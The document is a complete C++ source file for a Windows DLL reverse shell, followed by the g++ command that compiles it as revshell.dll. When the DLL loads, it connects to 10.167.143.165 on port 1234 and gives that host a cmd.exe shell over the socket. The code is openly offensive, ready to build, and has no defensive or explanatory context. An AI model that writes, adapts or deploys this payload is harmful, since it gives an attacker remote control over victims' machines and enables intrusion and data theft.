#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <process.h>

#pragma comment(lib, "Ws2_32.lib")

extern "C" __declspec(dllexport) void Execute()
{
    WSADATA wsaData;
    SOCKET s;
    struct sockaddr_in server;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    WSAStartup(MAKEWORD(2, 2), &wsaData);
    s = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

    server.sin_family = AF_INET;
    server.sin_port = htons(1234);  // Change port if needed
    server.sin_addr.s_addr = inet_addr("10.167.143.165");

    if (connect(s, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR)
    {
        closesocket(s);
        WSACleanup();
        return;
    }

    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = (HANDLE)s;
    si.hStdOutput = (HANDLE)s;
    si.hStdError = (HANDLE)s;

    CreateProcess(NULL, (LPSTR)"cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        Execute();
        break;
    }
    return TRUE;
}

(g++ --version, check and ensure that they actually have g++)
g++ -shared -o revshell.dll revshell.cpp -lws2_32
